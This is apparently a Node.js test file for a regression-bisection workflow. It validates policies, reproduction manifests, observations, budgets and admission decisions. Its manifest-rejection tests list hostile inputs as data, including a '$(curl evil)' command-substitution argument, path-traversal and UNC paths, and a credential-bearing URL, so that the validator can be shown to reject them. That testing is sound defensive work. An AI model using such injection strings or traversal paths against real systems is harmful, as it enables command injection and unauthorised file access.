const test = require("node:test");
const assert = require("node:assert/strict");
const {
    isEligibleIssue, validatePolicy, validateManifest, fingerprintInput, fingerprintEpoch,
    classifyAttempts, validateOutcome, validateObservation, validateState, admitBisection,
} = require("./model.cjs");
const { policy, manifest, attempt, observation, admission, state, seal, sha, digest, buildToolchain } = require("./fixtures/contracts.cjs");

const rejects = (fn, pattern = /./) => assert.throws(fn, pattern);

for (const [os, kind] of [
    ["windows", "publisher-checksum"], ["windows", "approved-official-https-measured"],
    ["linux", "publisher-checksum"], ["macos", "publisher-checksum"],
]) {
    test(`observation serializes and validates ${os} ${kind} without relabelling hashes`, () => {
        const approval = policy().toolchains.measuredArchives[0];
        const m = manifest();
        m.matrix[0].os = os;
        seal(m);
        const o = observation("source", "pass", m, approval.sourceSha);
        o.cells[0].buildToolchain = buildToolchain(approval.sourceSha, os, kind);
        const { archive } = o.cells[0].buildToolchain;
        assert.equal(validateObservation(JSON.parse(JSON.stringify(o)), m), true);
        for (const change of [
            a => { a.provenance.kind = "unknown"; },
            a => { a.provenance.approvalDigest = digest("forged"); },
            a => { a.retained.sha512 = "0".repeat(128); },
            a => { a.bytesReceived++; },
            a => { a.url = a.url.replace("26420", "26421"); },
            a => { a.redirects.push({ from: a.url, to: `${a.url}?other`, status: 302 }); },
            a => { a.architecture = "arm64"; },
            ...["relative.zip", "Q:relative.zip", os === "windows" ? "/retained/sdk.zip" : "Q:\\retained\\sdk.zip"]
                .map(file => a => { a.retained.path = file; }),
        ]) {
            const changed = structuredClone(o);
            change(changed.cells[0].buildToolchain.archive);
            rejects(() => validateObservation(changed, m));
        }
        if (kind === "approved-official-https-measured") {
            archive.sha512 = archive.actualSha512;
            rejects(() => validateObservation(o, m), /missing or unknown fields/);
        }
    });
}

for (const [check, reason] of [["network", "network-failure"], ["checksumProvenance", "checksum-provenance"]])
test(`${reason} is a blocked outcome, not missing SDK or a passing attempt`, () => {
    const m = manifest(), a = attempt("pass");
    a.checks[check] = false;
    const blocked = { schemaVersion: 1, outcome: "untestable", reason };
    assert.deepEqual(classifyAttempts([a, a], m), blocked);
    const o = observation("source", "pass", m);
    const cell = o.cells[0];
    cell.sdk = cell.runtime = null;
    cell.artifacts = Object.fromEntries(Object.keys(cell.artifacts).map(name => [name, null]));
    a.checks = Object.fromEntries(Object.keys(a.checks).map(name => [name, false]));
    a.checks.network = check !== "network";
    a.execution = { status: "exception", complete: false, exitCode: null, stdout: "", stderr: reason };
    cell.attempts = [a, a];
    cell.outcome = o.outcome = blocked;
    assert.deepEqual(classifyAttempts(cell.attempts, m), blocked);
    assert.equal(validateObservation(JSON.parse(JSON.stringify(o)), m), true);
    assert.equal(validateOutcome(blocked), true);
    for (const value of ["pass", "product-failure"]) {
        rejects(() => validateOutcome({ ...blocked, outcome: value }));
        const changed = structuredClone(o);
        changed.cells[0].outcome = changed.outcome = {
            schemaVersion: 1, outcome: value, reason: value === "pass" ? "positive-assertion" : "failure-assertion",
        };
        rejects(() => validateObservation(changed, m), /absent identities/);
    }
    const changed = structuredClone(o);
    changed.cells[0].attempts.forEach(a => { a.checks[check] = true; });
    rejects(() => validateObservation(changed, m), /does not match repeated evidence/);
});

for (const [name, patch, expected] of [
    ["before cutoff", { created_at: "2026-08-31T23:59:59.999Z" }, false],
    ["at cutoff", {}, true],
    ["after cutoff", { created_at: "2026-09-01T00:00:00.001Z" }, true],
    ["equivalent offset", { created_at: "2026-09-01T02:00:00+02:00" }, true],
    ["offset before cutoff", { created_at: "2026-09-01T00:00:00+01:00" }, false],
    ["invalid date", { created_at: "not a date" }, false],
    ["normalized invalid date", { created_at: "2026-09-31T00:00:00Z" }, false],
    ["no timezone", { created_at: "2026-09-01T00:00:00" }, false],
    ["closed", { state: "closed" }, false],
    ["pull request", { pull_request: {} }, false],
    ["null pull request marker", { pull_request: null }, false],
    ["wrong case", { labels: [{ name: "regression" }] }, false],
    ["missing labels", { labels: undefined }, false],
    ["string label", { labels: ["Regression"] }, true],
    ["updated is not created", { created_at: "2025-09-01T00:00:00Z", updated_at: "2026-09-02T00:00:00Z" }, false],
]) {
    test(`eligibility: ${name}`, () => {
        assert.equal(isEligibleIssue({
            state: "open", created_at: "2026-09-01T00:00:00Z", labels: [{ name: "Regression" }], ...patch,
        }), expected);
    });
}

test("policy has finite operational defaults, separate from issue authorization", () => {
    assert.equal(validatePolicy(policy()), true);
    assert.deepEqual(policy().limits, {
        sourceBuilds: 24, workerUnits: 40, reservedMinutes: 720, attemptsPerItem: 2,
        assertionRepetitions: 2, buildTimeoutMinutes: 90, reproductionTimeoutSeconds: 300,
        workerTimeoutMinutes: 110, discoveryIssues: 3, discoveryPages: 2, discoveryPageSize: 100,
    });
});

for (const key of Object.keys(policy().limits)) {
    for (const value of [-1, 0, 1.5, null, "unlimited", Infinity, policy().limits[key] + 1]) {
        test(`policy rejects ${key}=${value}`, () => {
            const p = policy();
            p.limits[key] = value;
            rejects(() => validatePolicy(p), /policy/);
        });
    }
}

for (const [section, field, value] of [
    ["limits", "sourceBuilds", 25],
    ["authorization", "mode", "issue-instructions"],
    ["selection", "createdAtOrAfter", "2025-09-01T00:00:00Z"],
]) {
    test(`policy rejects shared JSON mutation: ${section}.${field}`, () => {
        const shared = require("../../.github/policies/regression-bisect.json");
        const original = shared[section][field];
        const modelPath = require.resolve("./model.cjs");
        const cachedModel = require.cache[modelPath];
        try {
            shared[section][field] = value;
            delete require.cache[modelPath];
            for (const model of [cachedModel.exports, require("./model.cjs")]) {
                rejects(() => model.validatePolicy(shared), /policy/);
                assert.equal(model.isEligibleIssue({
                    state: "open", created_at: "2025-09-01T00:00:00Z", labels: ["Regression"],
                }), false);
            }
        } finally {
            require.cache[modelPath] = cachedModel;
            shared[section][field] = original;
        }
        assert.equal(validatePolicy(shared), true);
    });
}

for (const [name, edit] of [
    ["schema", m => m.schemaVersion = 2],
    ["unknown field", m => m.instructions = "run issue commands"],
    ["missing approval", m => delete m.approvedInputDigest],
    ["wrong approval digest", m => m.approvedInputDigest = digest("wrong")],
    ["traversal", m => m.sources[0].path = "../payload.fsx"],
    ["encoded traversal", m => m.sources[0].path = "%2e%2e/payload.fsx"],
    ["absolute path", m => m.sources[0].path = "C:\\payload.fsx"],
    ["UNC path", m => m.sources[0].path = "\\\\host\\payload.fsx"],
    ["URL source", m => m.sources[0].path = "https://example.org/code.fsx"],
    ["alternate stream", m => m.sources[0].path = "fixture.fsx:code"],
    ["shell string", m => m.matrix[0].command = "dotnet fsi repro.fsx"],
    ["interpolated argument", m => m.matrix[0].command.push("$(curl evil)")],
    ["unreviewed command source", m => m.matrix[0].command[1] = "other.fsx"],
    ["unsafe hint scheme", m => m.searchHints.urls = ["file:///tmp/code"]],
    ["malformed hint URL", m => m.searchHints.urls = ["not-a-url"]],
    ["URL credentials", m => m.searchHints.urls = ["https://user:secret@example.org/"]],
    ["unbounded timeout", m => m.timeoutSeconds = 301],
    ["package wildcard", m => m.packages[0].version = "1.*"],
    ["identical assertions", m => m.assertions.failure = structuredClone(m.assertions.pass)],
    ["empty matrix", m => m.matrix = []],
    ["duplicate matrix cell", m => m.matrix.push(structuredClone(m.matrix[0]))],
    ["duplicate source", m => m.sources.push(structuredClone(m.sources[0]))],
]) {
    test(`manifest rejects ${name}`, () => {
        const m = manifest();
        edit(m);
        if (!name.includes("approval")) seal(m);
        rejects(() => validateManifest(m), /manifest/);
    });
}

test("both reviewed fsi and project manifests validate", () => {
    assert.equal(validateManifest(manifest()), true);
    const m = manifest();
    m.kind = "project";
    m.sources.push({ path: "fixtures/repro.fsproj", sha256: digest("project") });
    m.matrix[0].project = "fixtures/repro.fsproj";
    m.matrix[0].command = ["run-project", "fixtures/repro.fsproj"];
    seal(m);
    assert.equal(validateManifest(m), true);
});

for (const [name, results, edit, expected, reason] of [
    ["passes", ["pass", "pass"], () => {}, "pass", "positive-assertion"],
    ["failures", ["product-failure", "product-failure"], () => {}, "product-failure", "failure-assertion"],
    ["flake", ["pass", "product-failure"], () => {}, "untestable", "flaky"],
    ["restore", ["pass", "pass"], a => a.checks.restore = false, "untestable", "restore-failure"],
    ["build", ["pass", "pass"], a => a.checks.build = false, "untestable", "build-failure"],
    ["setup", ["pass", "pass"], a => a.checks.setup = false, "untestable", "setup-failure"],
    ["identity", ["pass", "pass"], a => a.checks.identity = false, "untestable", "wrong-identity"],
    ["SDK", ["pass", "pass"], a => a.checks.sdk = false, "untestable", "unavailable-sdk"],
    ["runtime", ["pass", "pass"], a => a.checks.runtime = false, "untestable", "unavailable-runtime"],
    ["timeout", ["pass", "pass"], a => a.execution.status = "timeout", "untestable", "timeout"],
    ["exception", ["pass", "pass"], a => a.execution.status = "exception", "untestable", "unrelated-exception"],
    ["nonzero is not assertion", ["product-failure", "product-failure"], a => a.execution.stderr = "unrelated", "untestable", "assertion-mismatch"],
    ["incomplete output", ["pass", "pass"], a => a.execution.complete = false, "untestable", "incomplete-evidence"],
    ["missing evidence", ["pass", "pass"], a => delete a.execution, "untestable", "incomplete-evidence"],
    ["missing network check", ["pass", "pass"], a => delete a.checks.network, "untestable", "incomplete-evidence"],
    ...[null, "true", 1].map(value => [`invalid network check ${value}`, ["pass", "pass"],
        a => a.checks.network = value, "untestable", "incomplete-evidence"]),
    ["one repetition", ["pass"], () => {}, "untestable", "incomplete-evidence"],
]) {
    test(`classification: ${name}`, () => {
        const attempts = results.map(r => attempt(r));
        edit(attempts[0]);
        assert.deepEqual(classifyAttempts(attempts, manifest()), { schemaVersion: 1, outcome: expected, reason });
    });
}

test("outcome versions and reason combinations are validated", () => {
    assert.equal(validateOutcome({ schemaVersion: 1, outcome: "untestable", reason: "flaky" }), true);
    for (const value of [
        { schemaVersion: 2, outcome: "pass", reason: "positive-assertion" },
        { schemaVersion: 1, outcome: "green", reason: "positive-assertion" },
        { schemaVersion: 1, outcome: "pass", reason: "restore-failure" },
        { schemaVersion: 1, outcome: "product-failure", reason: "exit-code" },
    ]) rejects(() => validateOutcome(value), /outcome/);
});

test("neither repeated passes nor expected failures survive failed required checks", () => {
    for (const result of ["pass", "product-failure"]) {
        for (const check of Object.keys(attempt(result).checks)) {
            const attempts = [attempt(result), attempt(result)];
            attempts[1].checks[check] = false;
            assert.equal(classifyAttempts(attempts, manifest()).outcome, "untestable", `${result}: ${check}`);
        }
    }
});

const outcomes = ["pass", "product-failure", "untestable"];
for (const stable of outcomes) {
    for (const main of outcomes) {
        for (const good of outcomes) {
            test(`admission: ${stable}/${main}/${good}`, () => {
                const args = admission(stable, main, good);
                const result = admitBisection(args);
                assert.equal(result.decision === "admit", stable === "product-failure" && main === "product-failure" && good === "pass");
                assert.equal(typeof result.reason, "string");
                if ([stable, main, good].includes("untestable")) assert.equal(result.decision, "blocked");
            });
        }
    }
}

for (const [name, edit] of [
    ["missing manifest", a => delete a.manifest],
    ["missing good", a => delete a.good],
    ["missing approval", a => delete a.budget.authorization],
    ["self approved changed manifest", a => { a.manifest.assertions.pass.stdout = "changed"; seal(a.manifest); }],
    ["released-product-only good", a => a.good = observation("released", "pass", a.manifest)],
    ["nonancestor", a => a.ancestry.isAncestor = false],
    ["unknown ancestry", a => delete a.ancestry.isAncestor],
    ["same source", a => {
        a.good = observation("source", "pass", a.manifest, a.main.target.sourceSha);
        a.ancestry.goodSha = a.main.target.sourceSha;
    }],
    ["wrong main SHA", a => a.ancestry.pinnedMainSha = sha("other")],
    ["wrong matrix", a => a.good.matrixFingerprint = digest("other")],
    ["wrong producer", a => a.good.producerFingerprint = digest("other")],
    ["wrong digest", a => a.main.manifestDigest = digest("other")],
    ["wrong discussion", a => a.good.discussionFingerprint = digest("other")],
    ["wrong environment", a => a.good.cells[0].environment.imageDigest = digest("other")],
    ["wrong source SDK", a => a.good.cells[0].sdk.version = "9.0.100"],
    ["missing local Core", a => delete a.main.cells[0].artifacts.core],
    ["released compiler in source test", a => a.main.cells[0].artifacts.compiler.origin = "released-sdk"],
    ["wrong build instance", a => a.main.cells[0].artifacts.core.buildInstanceId = "other"],
    ["wrong artifact source", a => a.good.cells[0].artifacts.tasks.sourceSha = sha("other")],
    ["missing cell", a => a.main.cells = []],
    ["unverified evidence", a => a.budget.authenticatedObservationDigests = []],
    ["unverified SDK", a => a.stable.target.sdk.verified = false],
    ["installed SDK", a => a.stable.target.sdk.origin = "installed"],
    ["preview SDK", a => a.stable.target.sdk.version = "11.0.100-preview.1"],
    ["not latest stable", a => a.stable.target.sdk.latest = false],
    ["wrong resolved stable", a => a.budget.stableSdk.version = "9.0.100"],
    ["unofficial release index", a => a.stable.target.sdk.releaseIndexUrl = "https://example.org/releases-index.json"],
    ["wrong workflow", a => a.good.provenance.workflowRevision = sha("other")],
    ["forged outcome", a => a.good.outcome.outcome = "pass"],
    ["source budget", a => a.budget.consumed.sourceBuilds = policy().limits.sourceBuilds],
    ["worker budget", a => a.budget.consumed.workerUnits = policy().limits.workerUnits],
    ["time budget", a => a.budget.consumed.reservedMinutes = policy().limits.reservedMinutes - 109],
    ["attempts exhausted", a => a.budget.attempts = [{ workItemId: a.budget.nextWorkItemId, count: 2 }]],
    ["expanded budget", a => a.budget.policy.limits.workerUnits++],
    ["unknown admission field", a => a.override = true],
]) {
    test(`admission denies ${name}`, () => {
        const args = admission();
        if (name === "forged outcome") args.good = observation("source", "untestable", args.manifest, sha("good"));
        edit(args);
        if (name !== "unverified evidence") {
            args.budget.authenticatedObservationDigests = [args.stable, args.main, args.good]
                .filter(Boolean).map(fingerprintInput);
        }
        assert.notEqual(admitBisection(args).decision, "admit");
    });
}

test("invalid observation evidence is rejected even if the collector authenticated its digest", () => {
    for (const edit of [
        o => o.cells[0].attempts[0].checks.identity = false,
        o => o.cells[0].command = ["fsi", "unreviewed.fsx"],
        o => o.cells[0].attempts[0].execution.stdout = "x".repeat(16385),
        o => o.cells.push(structuredClone(o.cells[0])),
        o => o.provenance.runId = "",
        o => o.schemaVersion = 2,
    ]) {
        const o = observation("source", "pass", manifest(), sha("good"));
        edit(o);
        rejects(() => validateObservation(o, manifest()), /observation/);
    }
});

test("fresh final confirmations cannot use cached endpoint evidence", () => {
    const o = observation("source", "pass", manifest(), sha("good"));
    const finalConfirmation = { runId: o.provenance.runId, buildInstanceId: o.buildInstanceId };
    assert.equal(validateObservation(o, manifest(), { finalConfirmation }), true);
    rejects(() => validateObservation(o, manifest(), {
        finalConfirmation: { ...finalConfirmation, runId: "new-run" },
    }), /fresh/);
    rejects(() => validateObservation(o, manifest(), {
        finalConfirmation: { ...finalConfirmation, buildInstanceId: "new-build" },
    }), /fresh/);
    rejects(() => validateObservation(o, manifest(), { finalConfirmation: true }), /fresh/);
    o.cached = true;
    assert.equal(validateObservation(o, manifest()), true);
    rejects(() => validateObservation(o, manifest(), { finalConfirmation }), /fresh/);
});

test("multi-platform stable release identities bind each platform's archive", () => {
    const m = manifest();
    m.matrix.push({ ...m.matrix[0], id: "windows-arm64", os: "windows", architecture: "arm64" });
    seal(m);
    const o = observation("released", "product-failure", m);
    assert.equal(validateObservation(o, m), true);
    o.cells[1].sdk.sha256 = o.cells[0].sdk.sha256;
    rejects(() => validateObservation(o, m), /released SDK identity/);
});

test("source builds may use pinned prerelease toolchains without treating them as released stable", () => {
    const a = admission();
    for (const o of [a.main, a.good]) {
        o.cells[0].sdk.version = "11.0.100-rc.1.26420.103";
        o.cells[0].runtime.version = "11.0.0-rc.1.26420.103";
    }
    a.budget.authenticatedObservationDigests = [a.stable, a.main, a.good].map(fingerprintInput);
    assert.equal(admitBisection(a).decision, "admit");
});

for (const exitCode of [-2147483648, -1073741819, -1, 0, 2147483647, 2147483648, 3221225477, 4294967295]) {
    test(`assertions preserve process exit code ${exitCode}`, () => {
        const m = manifest();
        m.matrix[0].id = "windows-x64";
        m.matrix[0].os = "windows";
        m.assertions.failure.exitCode = exitCode;
        seal(m);
        assert.equal(validateManifest(m), true);
        const o = observation("source", "product-failure", m);
        for (const a of o.cells[0].attempts) a.execution.exitCode = exitCode;
        o.cells[0].outcome = o.outcome = classifyAttempts(o.cells[0].attempts, m);
        assert.deepEqual(o.outcome, { schemaVersion: 1, outcome: "product-failure", reason: "failure-assertion" });
        assert.equal(validateObservation(o, m), true);
    });
}

for (const exitCode of [-2147483649, 4294967296, 1.5, "1", null, NaN, Infinity]) {
    test(`invalid process exit code ${exitCode} (${typeof exitCode}) is rejected`, () => {
        const m = manifest();
        const attempts = [attempt("product-failure"), attempt("product-failure")];
        attempts[0].execution.exitCode = exitCode;
        assert.deepEqual(classifyAttempts(attempts, m), {
            schemaVersion: 1, outcome: "untestable", reason: "incomplete-evidence",
        });
        m.assertions.failure.exitCode = exitCode;
        rejects(() => validateManifest(m), /manifest.assertions.failure.exitCode: invalid exit code/);
    });
}

test("signed and unsigned process statuses do not satisfy each other's exact assertion", () => {
    for (const [expected, actual] of [[3221225477, -1073741819], [-1073741819, 3221225477]]) {
        const m = manifest();
        m.assertions.failure.exitCode = expected;
        seal(m);
        const attempts = [attempt("product-failure"), attempt("product-failure")];
        for (const a of attempts) a.execution.exitCode = actual;
        assert.deepEqual(classifyAttempts(attempts, m), {
            schemaVersion: 1, outcome: "untestable", reason: "assertion-mismatch",
        });
    }
});

for (const endpoint of ["stable", "main", "good"]) {
    for (const [first, second, reason] of [
        ["pass", "product-failure", "flaky"], ["product-failure", "pass", "flaky"],
        ["pass", "untestable", "assertion-mismatch"], ["untestable", "pass", "assertion-mismatch"],
        ["product-failure", "untestable", "assertion-mismatch"], ["untestable", "product-failure", "assertion-mismatch"],
    ]) {
        test(`matrix aggregation: ${endpoint} ${first}/${second}`, () => {
            const a = admission();
            a.manifest.matrix.push({ ...a.manifest.matrix[0], id: "debug", configuration: "Debug" });
            seal(a.manifest);
            a.stable = observation("released", "product-failure", a.manifest);
            a.main = observation("source", "product-failure", a.manifest);
            a.good = observation("source", "pass", a.manifest, sha("good"));
            a.budget.authorization.manifestDigest = fingerprintInput(a.manifest);
            a.budget.authorization.inputDigest = a.manifest.approvedInputDigest;
            a.budget.authenticatedObservationDigests = [a.stable, a.main, a.good].map(fingerprintInput);
            assert.equal(admitBisection(a).decision, "admit");
            const o = a[endpoint];
            const claimed = o.outcome;
            for (const [i, result] of [first, second].entries()) {
                const cell = o.cells[i];
                cell.attempts = [attempt(result), attempt(result)];
                cell.outcome = classifyAttempts(cell.attempts, a.manifest);
            }
            o.outcome = { schemaVersion: 1, outcome: "untestable", reason };
            assert.equal(validateObservation(o, a.manifest), true);
            a.budget.authenticatedObservationDigests = [a.stable, a.main, a.good].map(fingerprintInput);
            assert.deepEqual(admitBisection(a), { decision: "blocked", reason: "untestable endpoint evidence" });
            o.outcome = claimed;
            rejects(() => validateObservation(o, a.manifest), /observation.outcome: does not match matrix evidence/);
        });
    }
}

test("budget boundary includes the whole worker reservation and retry cost", () => {
    const a = admission();
    a.budget.consumed = { sourceBuilds: 23, workerUnits: 39, reservedMinutes: 610 };
    a.budget.attempts = [{ workItemId: a.budget.nextWorkItemId, count: 1 }];
    assert.equal(admitBisection(a).decision, "admit");
    a.budget.consumed.reservedMinutes++;
    assert.match(admitBisection(a).reason, /budget/);
});

test("a charged reservation remains usable at the allowance boundary, but cannot cover another item", () => {
    const a = admission();
    a.budget.consumed = { sourceBuilds: 24, workerUnits: 40, reservedMinutes: 720 };
    a.budget.attempts = [{ workItemId: a.budget.nextWorkItemId, count: 2 }];
    a.budget.pendingWork = {
        id: "last-reservation", allowanceId: a.budget.allowanceId, workItemId: a.budget.nextWorkItemId,
        attempt: 2, reserved: { sourceBuilds: 1, workerUnits: 1, reservedMinutes: 110 }, status: "reserved",
    };
    assert.equal(admitBisection(a).decision, "admit");
    a.budget.pendingWork.workItemId = "unreserved-item";
    assert.equal(admitBisection(a).decision, "blocked");
});

test("unavailable runtime can be recorded as untestable without fabricating its identity", () => {
    const o = observation("source", "pass", manifest());
    o.cells[0].runtime = null;
    for (const a of o.cells[0].attempts) a.checks.runtime = false;
    o.cells[0].outcome = o.outcome = classifyAttempts(o.cells[0].attempts, manifest());
    assert.equal(o.outcome.reason, "unavailable-runtime");
    assert.equal(validateObservation(o, manifest()), true);
    o.cells[0].attempts[0].checks.runtime = true;
    rejects(() => validateObservation(o, manifest()), /identity/);
});

test("canonical hashes preserve array order, exact source bytes, and diagnostic whitespace", () => {
    assert.equal(fingerprintInput({ b: 2, a: { d: 4, c: 3 } }), fingerprintInput({ a: { c: 3, d: 4 }, b: 2 }));
    for (const [a, b] of [
        [["a", "b"], ["b", "a"]], ["source\r\n", "source\n"], ["FS0001: a b", "FS0001: a  b"],
        [{ body: "old" }, { body: "corrected" }],
        [{ comments: [{ id: 1, body: "old", updatedAt: "a" }] }, { comments: [{ id: 1, body: "edited", updatedAt: "b" }] }],
    ]) assert.notEqual(fingerprintInput(a), fingerprintInput(b));
    for (const value of [undefined, NaN, Infinity, { a: undefined }, new Date(), () => {}]) {
        rejects(() => fingerprintInput(value), /JSON/);
    }
    const cycle = {};
    cycle.self = cycle;
    rejects(() => fingerprintInput(cycle), /JSON/);
    rejects(() => fingerprintInput(Array(1)), /JSON/);
});

test("pending reservations and cancelled attempts remain charged in state", () => {
    const s = state();
    s.budget.attempts = [{ workItemId: s.budget.nextWorkItemId, count: 1 }];
    s.budget.pendingWork = {
        id: "reservation-1", allowanceId: s.budget.allowanceId, workItemId: s.budget.nextWorkItemId,
        attempt: 1, reserved: { sourceBuilds: 1, workerUnits: 1, reservedMinutes: 110 }, status: "reserved",
    };
    assert.equal(validateState(s), true);
    s.budget.pendingWork.status = "running";
    assert.equal(validateState(s), true);
    const consumed = structuredClone(s.budget.consumed);
    s.budget.pendingWork = null;
    assert.equal(validateState(s), true);
    assert.deepEqual(s.budget.consumed, consumed);
    s.budget.consumed.workerUnits = 0;
    rejects(() => validateState(s), /charged/);
});

test("workflow-looking text never erases discussion records", () => {
    const input = { issue: { body: "repro" }, comments: [{ id: 1, body: "<!-- regression-bisect -->", author: "github-actions[bot]" }] };
    assert.notEqual(fingerprintInput(input), fingerprintInput({ ...input, comments: [] }));
    input.comments[0].authenticated = true;
    assert.notEqual(fingerprintInput(input), fingerprintInput({ ...input, comments: [] }));
});

test("approval and input are independent of main; epoch binds main and stable", () => {
    const args = admission();
    const first = fingerprintEpoch(args.manifest, args.budget, args.ancestry.pinnedMainSha);
    const approvalDigest = args.manifest.approvedInputDigest;
    assert.notEqual(first, fingerprintEpoch(args.manifest, args.budget, sha("new-main")));
    args.budget.stableSdk.version = "10.0.101";
    assert.notEqual(first, fingerprintEpoch(args.manifest, args.budget, args.ancestry.pinnedMainSha));
    assert.equal(args.manifest.approvedInputDigest, approvalDigest);
    for (const edit of [m => m.sources[0].sha256 = digest("edit"), m => m.assertions.failure.stderr += " "]) {
        const m = manifest();
        edit(m);
        rejects(() => validateManifest(m), /digest/);
    }
});

for (const [name, edit] of [
    ["missing policy revision", b => delete b.policyRevision],
    ["unpinned policy revision", b => b.policyRevision = "main"],
    ["null workflow revision", b => b.workflowRevision = null],
    ["unpinned workflow revision", b => b.workflowRevision = "main"],
    ["missing approval", b => delete b.authorization],
]) {
    test(`epoch rejects ${name}`, () => {
        const a = admission();
        edit(a.budget);
        rejects(() => fingerprintEpoch(a.manifest, a.budget, a.ancestry.pinnedMainSha), /budget/);
    });
}

test("epoch identity excludes charged work and binds both trusted revisions", () => {
    const a = admission();
    const epoch = () => fingerprintEpoch(a.manifest, a.budget, a.ancestry.pinnedMainSha);
    const original = epoch();
    a.budget.consumed = { sourceBuilds: 3, workerUnits: 4, reservedMinutes: 440 };
    assert.equal(epoch(), original);
    for (const field of ["policyRevision", "workflowRevision"]) {
        const revision = a.budget[field];
        a.budget[field] = sha("new-revision");
        if (field === "policyRevision") a.budget.authorization.approvalRevision = a.budget[field];
        assert.notEqual(epoch(), original);
        a.budget[field] = revision;
        a.budget.authorization.approvalRevision = a.budget.policyRevision;
    }
});

test("state contract carries durable allowance, reservations, evidence, interval and publication", () => {
    assert.equal(validateState(state()), true);
    for (const edit of [
        s => delete s.budget.pendingWork,
        s => s.schemaVersion = 2,
        s => s.epoch = digest("wrong"),
        s => s.budget.consumed.workerUnits = -1,
        s => s.budget.pendingWork = { id: "unaccounted" },
        s => s.budget.allowanceId = "",
        s => s.phase = "anything",
        s => s.endpointEvidence.main = "not a digest",
        s => s.publication.commentId = -1,
        s => s.budget.authorization.approvalPath = ".github/regression-bisect/approved/other.json",
    ]) {
        const s = state();
        edit(s);
        rejects(() => validateState(s), /state/);
    }
});
